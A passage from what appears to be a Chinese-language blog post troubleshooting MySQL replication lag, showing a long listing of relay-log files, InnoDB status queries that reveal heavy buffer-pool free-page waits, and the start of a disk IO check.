Aug 19 12:50 server-6-relay-bin.004912</span><br><span class="line">-rw-r----- 1 mysql mysql     472751 Aug 19 12:50 server-6-relay-bin.004913</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 12:50 server-6-relay-bin.004914</span><br><span class="line">-rw-r----- 1 mysql mysql 1075262040 Aug 19 13:00 server-6-relay-bin.004915</span><br><span class="line">-rw-r----- 1 mysql mysql       3009 Aug 19 13:00 server-6-relay-bin.004916</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:00 server-6-relay-bin.004917</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747998 Aug 19 13:15 server-6-relay-bin.004918</span><br><span class="line">-rw-r----- 1 mysql mysql     421255 Aug 19 13:15 server-6-relay-bin.004919</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:15 server-6-relay-bin.004920</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742443 Aug 19 13:31 server-6-relay-bin.004921</span><br><span class="line">-rw-r----- 1 mysql mysql      21636 Aug 19 13:31 server-6-relay-bin.004922</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:31 server-6-relay-bin.004923</span><br><span class="line">-rw-r----- 1 mysql mysql 1074325521 Aug 19 13:47 server-6-relay-bin.004924</span><br><span class="line">-rw-r----- 1 mysql mysql       8141 Aug 19 13:47 server-6-relay-bin.004925</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 13:47 server-6-relay-bin.004926</span><br><span class="line">-rw-r----- 1 mysql mysql 1074539167 Aug 19 14:01 server-6-relay-bin.004927</span><br><span class="line">-rw-r----- 1 mysql mysql       3783 Aug 19 14:01 server-6-relay-bin.004928</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:01 server-6-relay-bin.004929</span><br><span class="line">-rw-r----- 1 mysql mysql 1073756221 Aug 19 14:15 server-6-relay-bin.004930</span><br><span class="line">-rw-r----- 1 mysql mysql     505231 Aug 19 14:15 server-6-relay-bin.004931</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:15 server-6-relay-bin.004932</span><br><span class="line">-rw-r----- 1 mysql mysql 1073741891 Aug 19 14:32 server-6-relay-bin.004933</span><br><span class="line">-rw-r----- 1 mysql mysql    2159339 Aug 19 14:32 server-6-relay-bin.004934</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:32 server-6-relay-bin.004935</span><br><span class="line">-rw-r----- 1 mysql mysql 1074633232 Aug 19 14:48 server-6-relay-bin.004936</span><br><span class="line">-rw-r----- 1 mysql mysql       5415 Aug 19 14:48 server-6-relay-bin.004937</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 14:48 server-6-relay-bin.004938</span><br><span class="line">-rw-r----- 1 mysql mysql 1074746727 Aug 19 15:03 server-6-relay-bin.004939</span><br><span class="line">-rw-r----- 1 mysql mysql       2791 Aug 19 15:03 server-6-relay-bin.004940</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:03 server-6-relay-bin.004941</span><br><span class="line">-rw-r----- 1 mysql mysql 1074641101 Aug 19 15:18 server-6-relay-bin.004942</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 15:18 server-6-relay-bin.004943</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:18 server-6-relay-bin.004944</span><br><span class="line">-rw-r----- 1 mysql mysql 1074670108 Aug 19 15:35 server-6-relay-bin.004945</span><br><span class="line">-rw-r----- 1 mysql mysql     544530 Aug 19 15:35 server-6-relay-bin.004946</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:35 server-6-relay-bin.004947</span><br><span class="line">-rw-r----- 1 mysql mysql 1075095236 Aug 19 15:50 server-6-relay-bin.004948</span><br><span class="line">-rw-r----- 1 mysql mysql     370712 Aug 19 15:50 server-6-relay-bin.004949</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 15:50 server-6-relay-bin.004950</span><br><span class="line">-rw-r----- 1 mysql mysql 1075138343 Aug 19 16:01 server-6-relay-bin.004951</span><br><span class="line">-rw-r----- 1 mysql mysql       1148 Aug 19 16:01 server-6-relay-bin.004952</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:01 server-6-relay-bin.004953</span><br><span class="line">-rw-r----- 1 mysql mysql 1073753579 Aug 19 16:15 server-6-relay-bin.004954</span><br><span class="line">-rw-r----- 1 mysql mysql     166719 Aug 19 16:15 server-6-relay-bin.004955</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:15 server-6-relay-bin.004956</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744509 Aug 19 16:31 server-6-relay-bin.004957</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 16:31 server-6-relay-bin.004958</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:31 server-6-relay-bin.004959</span><br><span class="line">-rw-r----- 1 mysql mysql 1075785150 Aug 19 16:48 server-6-relay-bin.004960</span><br><span class="line">-rw-r----- 1 mysql mysql       3213 Aug 19 16:48 server-6-relay-bin.004961</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 16:48 server-6-relay-bin.004962</span><br><span class="line">-rw-r----- 1 mysql mysql 1074787881 Aug 19 17:04 server-6-relay-bin.004963</span><br><span class="line">-rw-r----- 1 mysql mysql       3117 Aug 19 17:04 server-6-relay-bin.004964</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:04 server-6-relay-bin.004965</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742293 Aug 19 17:16 server-6-relay-bin.004966</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 17:16 server-6-relay-bin.004967</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:16 server-6-relay-bin.004968</span><br><span class="line">-rw-r----- 1 mysql mysql 1073875360 Aug 19 17:35 server-6-relay-bin.004969</span><br><span class="line">-rw-r----- 1 mysql mysql     561335 Aug 19 17:35 server-6-relay-bin.004970</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:35 server-6-relay-bin.004971</span><br><span class="line">-rw-r----- 1 mysql mysql 1075427971 Aug 19 17:51 server-6-relay-bin.004972</span><br><span class="line">-rw-r----- 1 mysql mysql     119238 Aug 19 17:51 server-6-relay-bin.004973</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 17:51 server-6-relay-bin.004974</span><br><span class="line">-rw-r----- 1 mysql mysql 1074518543 Aug 19 18:06 server-6-relay-bin.004975</span><br><span class="line">-rw-r----- 1 mysql mysql       1392 Aug 19 18:06 server-6-relay-bin.004976</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:06 server-6-relay-bin.004977</span><br><span class="line">-rw-r----- 1 mysql mysql 1075430034 Aug 19 18:18 server-6-relay-bin.004978</span><br><span class="line">-rw-r----- 1 mysql mysql        777 Aug 19 18:18 server-6-relay-bin.004979</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:18 server-6-relay-bin.004980</span><br><span class="line">-rw-r----- 1 mysql mysql 1074768456 Aug 19 18:36 server-6-relay-bin.004981</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 18:36 server-6-relay-bin.004982</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:36 server-6-relay-bin.004983</span><br><span class="line">-rw-r----- 1 mysql mysql 1074375191 Aug 19 18:54 server-6-relay-bin.004984</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 18:54 server-6-relay-bin.004985</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 18:54 server-6-relay-bin.004986</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742784 Aug 19 19:08 server-6-relay-bin.004987</span><br><span class="line">-rw-r----- 1 mysql mysql       5045 Aug 19 19:08 server-6-relay-bin.004988</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 19:08 server-6-relay-bin.004989</span><br><span class="line">-rw-r----- 1 mysql mysql 1074531001 Aug 19 19:24 server-6-relay-bin.004990</span><br><span class="line">-rw-r----- 1 mysql mysql       7092 Aug 19 19:24 server-6-relay-bin.004991</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 19:24 server-6-relay-bin.004992</span><br><span class="line">-rw-r----- 1 mysql mysql 1073942849 Aug 19 19:43 server-6-relay-bin.004993</span><br><span class="line">-rw-r----- 1 mysql mysql       3298 Aug 19 19:43 server-6-relay-bin.004994</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 19:43 server-6-relay-bin.004995</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747538 Aug 19 20:00 server-6-relay-bin.004996</span><br><span class="line">-rw-r----- 1 mysql mysql     358612 Aug 19 20:00 server-6-relay-bin.004997</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:00 server-6-relay-bin.004998</span><br><span class="line">-rw-r----- 1 mysql mysql 1075636850 Aug 19 20:12 server-6-relay-bin.004999</span><br><span class="line">-rw-r----- 1 mysql mysql      12810 Aug 19 20:12 server-6-relay-bin.005000</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:12 server-6-relay-bin.005001</span><br><span class="line">-rw-r----- 1 mysql mysql 1073748897 Aug 19 20:25 server-6-relay-bin.005002</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 20:25 server-6-relay-bin.005003</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:25 server-6-relay-bin.005004</span><br><span class="line">-rw-r----- 1 mysql mysql 1075627773 Aug 19 20:44 server-6-relay-bin.005005</span><br><span class="line">-rw-r----- 1 mysql mysql       1452 Aug 19 20:44 server-6-relay-bin.005006</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 20:44 server-6-relay-bin.005007</span><br><span class="line">-rw-r----- 1 mysql mysql 1073973063 Aug 19 21:02 server-6-relay-bin.005008</span><br><span class="line">-rw-r----- 1 mysql mysql      12392 Aug 19 21:02 server-6-relay-bin.005009</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:02 server-6-relay-bin.005010</span><br><span class="line">-rw-r----- 1 mysql mysql 1074198559 Aug 19 21:18 server-6-relay-bin.005011</span><br><span class="line">-rw-r----- 1 mysql mysql       9813 Aug 19 21:18 server-6-relay-bin.005012</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:18 server-6-relay-bin.005013</span><br><span class="line">-rw-r----- 1 mysql mysql 1073750958 Aug 19 21:35 server-6-relay-bin.005014</span><br><span class="line">-rw-r----- 1 mysql mysql     415417 Aug 19 21:35 server-6-relay-bin.005015</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:35 server-6-relay-bin.005016</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757766 Aug 19 21:55 server-6-relay-bin.005017</span><br><span class="line">-rw-r----- 1 mysql mysql     484712 Aug 19 21:55 server-6-relay-bin.005018</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 21:55 server-6-relay-bin.005019</span><br><span class="line">-rw-r----- 1 mysql mysql 1074704096 Aug 19 22:14 server-6-relay-bin.005020</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 22:14 server-6-relay-bin.005021</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:14 server-6-relay-bin.005022</span><br><span class="line">-rw-r----- 1 mysql mysql 1074567071 Aug 19 22:25 server-6-relay-bin.005023</span><br><span class="line">-rw-r----- 1 mysql mysql       3299 Aug 19 22:25 server-6-relay-bin.005024</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:25 server-6-relay-bin.005025</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747930 Aug 19 22:35 server-6-relay-bin.005026</span><br><span class="line">-rw-r----- 1 mysql mysql     152479 Aug 19 22:35 server-6-relay-bin.005027</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:35 server-6-relay-bin.005028</span><br><span class="line">-rw-r----- 1 mysql mysql 1073749573 Aug 19 22:55 server-6-relay-bin.005029</span><br><span class="line">-rw-r----- 1 mysql mysql     206060 Aug 19 22:55 server-6-relay-bin.005030</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 22:55 server-6-relay-bin.005031</span><br><span class="line">-rw-r----- 1 mysql mysql 1073974611 Aug 19 23:14 server-6-relay-bin.005032</span><br><span class="line">-rw-r----- 1 mysql mysql      16223 Aug 19 23:14 server-6-relay-bin.005033</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:14 server-6-relay-bin.005034</span><br><span class="line">-rw-r----- 1 mysql mysql 1073747289 Aug 19 23:30 server-6-relay-bin.005035</span><br><span class="line">-rw-r----- 1 mysql mysql     394623 Aug 19 23:30 server-6-relay-bin.005036</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:30 server-6-relay-bin.005037</span><br><span class="line">-rw-r----- 1 mysql mysql 1073964634 Aug 19 23:40 server-6-relay-bin.005038</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 19 23:40 server-6-relay-bin.005039</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:40 server-6-relay-bin.005040</span><br><span class="line">-rw-r----- 1 mysql mysql 1074362909 Aug 19 23:51 server-6-relay-bin.005041</span><br><span class="line">-rw-r----- 1 mysql mysql       3074 Aug 19 23:51 server-6-relay-bin.005042</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 19 23:51 server-6-relay-bin.005043</span><br><span class="line">-rw-r----- 1 mysql mysql 1073753748 Aug 20 00:06 server-6-relay-bin.005044</span><br><span class="line">-rw-r----- 1 mysql mysql     365716 Aug 20 00:06 server-6-relay-bin.005045</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:06 server-6-relay-bin.005046</span><br><span class="line">-rw-r----- 1 mysql mysql 1075420004 Aug 20 00:21 server-6-relay-bin.005047</span><br><span class="line">-rw-r----- 1 mysql mysql       4027 Aug 20 00:21 server-6-relay-bin.005048</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:21 server-6-relay-bin.005049</span><br><span class="line">-rw-r----- 1 mysql mysql 1073757176 Aug 20 00:40 server-6-relay-bin.005050</span><br><span class="line">-rw-r----- 1 mysql mysql      17029 Aug 20 00:40 server-6-relay-bin.005051</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:40 server-6-relay-bin.005052</span><br><span class="line">-rw-r----- 1 mysql mysql 1074848048 Aug 20 00:56 server-6-relay-bin.005053</span><br><span class="line">-rw-r----- 1 mysql mysql       2106 Aug 20 00:56 server-6-relay-bin.005054</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 00:56 server-6-relay-bin.005055</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744109 Aug 20 01:15 server-6-relay-bin.005056</span><br><span class="line">-rw-r----- 1 mysql mysql     167283 Aug 20 01:15 server-6-relay-bin.005057</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 01:15 server-6-relay-bin.005058</span><br><span class="line">-rw-r----- 1 mysql mysql 1073863153 Aug 20 01:31 server-6-relay-bin.005059</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 01:31 server-6-relay-bin.005060</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 01:31 server-6-relay-bin.005061</span><br><span class="line">-rw-r----- 1 mysql mysql 1073755275 Aug 20 01:50 server-6-relay-bin.005062</span><br><span class="line">-rw-r----- 1 mysql mysql     351680 Aug 20 01:50 server-6-relay-bin.005063</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 01:50 server-6-relay-bin.005064</span><br><span class="line">-rw-r----- 1 mysql mysql 1073745924 Aug 20 02:00 server-6-relay-bin.005065</span><br><span class="line">-rw-r----- 1 mysql mysql     184126 Aug 20 02:00 server-6-relay-bin.005066</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:00 server-6-relay-bin.005067</span><br><span class="line">-rw-r----- 1 mysql mysql 1074559080 Aug 20 02:11 server-6-relay-bin.005068</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 02:11 server-6-relay-bin.005069</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:11 server-6-relay-bin.005070</span><br><span class="line">-rw-r----- 1 mysql mysql 1074703077 Aug 20 02:21 server-6-relay-bin.005071</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 02:21 server-6-relay-bin.005072</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:21 server-6-relay-bin.005073</span><br><span class="line">-rw-r----- 1 mysql mysql 1075168834 Aug 20 02:31 server-6-relay-bin.005074</span><br><span class="line">-rw-r----- 1 mysql mysql       3009 Aug 20 02:31 server-6-relay-bin.005075</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:31 server-6-relay-bin.005076</span><br><span class="line">-rw-r----- 1 mysql mysql 1073786213 Aug 20 02:41 server-6-relay-bin.005077</span><br><span class="line">-rw-r----- 1 mysql mysql       1969 Aug 20 02:41 server-6-relay-bin.005078</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:41 server-6-relay-bin.005079</span><br><span class="line">-rw-r----- 1 mysql mysql 1075261516 Aug 20 02:52 server-6-relay-bin.005080</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 02:52 server-6-relay-bin.005081</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 02:52 server-6-relay-bin.005082</span><br><span class="line">-rw-r----- 1 mysql mysql 1074090288 Aug 20 03:03 server-6-relay-bin.005083</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:03 server-6-relay-bin.005084</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:03 server-6-relay-bin.005085</span><br><span class="line">-rw-r----- 1 mysql mysql 1074140925 Aug 20 03:13 server-6-relay-bin.005086</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:13 server-6-relay-bin.005087</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:13 server-6-relay-bin.005088</span><br><span class="line">-rw-r----- 1 mysql mysql 1074942298 Aug 20 03:23 server-6-relay-bin.005089</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:23 server-6-relay-bin.005090</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:23 server-6-relay-bin.005091</span><br><span class="line">-rw-r----- 1 mysql mysql 1073946866 Aug 20 03:33 server-6-relay-bin.005092</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:33 server-6-relay-bin.005093</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:33 server-6-relay-bin.005094</span><br><span class="line">-rw-r----- 1 mysql mysql 1074995326 Aug 20 03:43 server-6-relay-bin.005095</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:43 server-6-relay-bin.005096</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:43 server-6-relay-bin.005097</span><br><span class="line">-rw-r----- 1 mysql mysql 1074411312 Aug 20 03:53 server-6-relay-bin.005098</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 03:53 server-6-relay-bin.005099</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 03:53 server-6-relay-bin.005100</span><br><span class="line">-rw-r----- 1 mysql mysql 1073961985 Aug 20 04:03 server-6-relay-bin.005101</span><br><span class="line">-rw-r----- 1 mysql mysql       1581 Aug 20 04:03 server-6-relay-bin.005102</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:03 server-6-relay-bin.005103</span><br><span class="line">-rw-r----- 1 mysql mysql 1073987949 Aug 20 04:14 server-6-relay-bin.005104</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:14 server-6-relay-bin.005105</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:14 server-6-relay-bin.005106</span><br><span class="line">-rw-r----- 1 mysql mysql 1074580980 Aug 20 04:23 server-6-relay-bin.005107</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:23 server-6-relay-bin.005108</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:23 server-6-relay-bin.005109</span><br><span class="line">-rw-r----- 1 mysql mysql 1074915235 Aug 20 04:32 server-6-relay-bin.005110</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:32 server-6-relay-bin.005111</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:32 server-6-relay-bin.005112</span><br><span class="line">-rw-r----- 1 mysql mysql 1073750177 Aug 20 04:42 server-6-relay-bin.005113</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 04:42 server-6-relay-bin.005114</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:42 server-6-relay-bin.005115</span><br><span class="line">-rw-r----- 1 mysql mysql 1075582907 Aug 20 04:52 server-6-relay-bin.005116</span><br><span class="line">-rw-r----- 1 mysql mysql       1654 Aug 20 04:52 server-6-relay-bin.005117</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 04:52 server-6-relay-bin.005118</span><br><span class="line">-rw-r----- 1 mysql mysql 1073831777 Aug 20 05:02 server-6-relay-bin.005119</span><br><span class="line">-rw-r----- 1 mysql mysql        944 Aug 20 05:02 server-6-relay-bin.005120</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:02 server-6-relay-bin.005121</span><br><span class="line">-rw-r----- 1 mysql mysql 1073939965 Aug 20 05:12 server-6-relay-bin.005122</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 05:12 server-6-relay-bin.005123</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:12 server-6-relay-bin.005124</span><br><span class="line">-rw-r----- 1 mysql mysql 1074975635 Aug 20 05:23 server-6-relay-bin.005125</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 05:23 server-6-relay-bin.005126</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:23 server-6-relay-bin.005127</span><br><span class="line">-rw-r----- 1 mysql mysql 1073775752 Aug 20 05:34 server-6-relay-bin.005128</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 05:34 server-6-relay-bin.005129</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:34 server-6-relay-bin.005130</span><br><span class="line">-rw-r----- 1 mysql mysql 1073748439 Aug 20 05:45 server-6-relay-bin.005131</span><br><span class="line">-rw-r----- 1 mysql mysql      50123 Aug 20 05:45 server-6-relay-bin.005132</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 05:45 server-6-relay-bin.005133</span><br><span class="line">-rw-r----- 1 mysql mysql 1074232059 Aug 20 06:00 server-6-relay-bin.005134</span><br><span class="line">-rw-r----- 1 mysql mysql     218243 Aug 20 06:00 server-6-relay-bin.005135</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 06:00 server-6-relay-bin.005136</span><br><span class="line">-rw-r----- 1 mysql mysql 1073742109 Aug 20 06:29 server-6-relay-bin.005137</span><br><span class="line">-rw-r----- 1 mysql mysql     566273 Aug 20 06:29 server-6-relay-bin.005138</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 06:29 server-6-relay-bin.005139</span><br><span class="line">-rw-r----- 1 mysql mysql 1073743811 Aug 20 06:50 server-6-relay-bin.005140</span><br><span class="line">-rw-r----- 1 mysql mysql     496397 Aug 20 06:50 server-6-relay-bin.005141</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 06:50 server-6-relay-bin.005142</span><br><span class="line">-rw-r----- 1 mysql mysql 1074448682 Aug 20 07:04 server-6-relay-bin.005143</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 07:04 server-6-relay-bin.005144</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:04 server-6-relay-bin.005145</span><br><span class="line">-rw-r----- 1 mysql mysql 1073933474 Aug 20 07:16 server-6-relay-bin.005146</span><br><span class="line">-rw-r----- 1 mysql mysql       5355 Aug 20 07:16 server-6-relay-bin.005147</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:16 server-6-relay-bin.005148</span><br><span class="line">-rw-r----- 1 mysql mysql 1074128415 Aug 20 07:29 server-6-relay-bin.005149</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 07:29 server-6-relay-bin.005150</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:29 server-6-relay-bin.005151</span><br><span class="line">-rw-r----- 1 mysql mysql 1074672741 Aug 20 07:40 server-6-relay-bin.005152</span><br><span class="line">-rw-r----- 1 mysql mysql       1335 Aug 20 07:40 server-6-relay-bin.005153</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:40 server-6-relay-bin.005154</span><br><span class="line">-rw-r----- 1 mysql mysql 1074458702 Aug 20 07:51 server-6-relay-bin.005155</span><br><span class="line">-rw-r----- 1 mysql mysql      10856 Aug 20 07:51 server-6-relay-bin.005156</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 07:51 server-6-relay-bin.005157</span><br><span class="line">-rw-r----- 1 mysql mysql 1073924438 Aug 20 08:01 server-6-relay-bin.005158</span><br><span class="line">-rw-r----- 1 mysql mysql        832 Aug 20 08:01 server-6-relay-bin.005159</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:01 server-6-relay-bin.005160</span><br><span class="line">-rw-r----- 1 mysql mysql 1075303853 Aug 20 08:13 server-6-relay-bin.005161</span><br><span class="line">-rw-r----- 1 mysql mysql       3783 Aug 20 08:13 server-6-relay-bin.005162</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:13 server-6-relay-bin.005163</span><br><span class="line">-rw-r----- 1 mysql mysql 1075011674 Aug 20 08:25 server-6-relay-bin.005164</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 08:25 server-6-relay-bin.005165</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:25 server-6-relay-bin.005166</span><br><span class="line">-rw-r----- 1 mysql mysql 1073759149 Aug 20 08:45 server-6-relay-bin.005167</span><br><span class="line">-rw-r----- 1 mysql mysql     595560 Aug 20 08:45 server-6-relay-bin.005168</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 08:45 server-6-relay-bin.005169</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744454 Aug 20 09:21 server-6-relay-bin.005170</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 09:21 server-6-relay-bin.005171</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 09:21 server-6-relay-bin.005172</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744721 Aug 20 09:59 server-6-relay-bin.005173</span><br><span class="line">-rw-r----- 1 mysql mysql        329 Aug 20 09:59 server-6-relay-bin.005174</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 09:59 server-6-relay-bin.005175</span><br><span class="line">-rw-r----- 1 mysql mysql 1073744402 Aug 20 10:33 server-6-relay-bin.005176</span><br><span class="line">-rw-r----- 1 mysql mysql       1415 Aug 20 10:33 server-6-relay-bin.005177</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 10:33 server-6-relay-bin.005178</span><br><span class="line">-rw-r----- 1 mysql mysql  492892939 Aug 20 10:47 server-6-relay-bin.005179</span><br><span class="line">-rw-r----- 1 mysql mysql        210 Aug 20 10:47 server-6-relay-bin.005180</span><br><span class="line">-rw-r----- 1 mysql mysql  581257657 Aug 20 11:05 server-6-relay-bin.005181</span><br><span class="line">-rw-r----- 1 mysql mysql        257 Aug 20 11:05 server-6-relay-bin.005182</span><br><span class="line">-rw-r----- 1 mysql mysql   89230476 Aug 20 11:07 server-6-relay-bin.005183</span><br></pre></td></tr></table></figure><p>4.查看innoDB的相关配置:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global status like &apos;%innodb_log%&apos;;</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| Variable_name             | Value      |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">| Innodb_log_waits          | 0          |</span><br><span class="line">| Innodb_log_write_requests | 1563734583 |</span><br><span class="line">| Innodb_log_writes         | 259641866  |</span><br><span class="line">+---------------------------+------------+</span><br><span class="line">3 rows in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show global status like &apos;%innodb_buffer_pool_wait%&apos;;</span><br><span class="line">+------------------------------+----------+</span><br><span class="line">| Variable_name                | Value    |</span><br><span class="line">+------------------------------+----------+</span><br><span class="line">| Innodb_buffer_pool_wait_free | 13307693 |</span><br><span class="line">+------------------------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>发现缓冲池有大量的空闲页等待被执行</p><p>5.初步怀疑是从库的sql语句读写速度比较慢,查看服务器磁盘IO情况:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 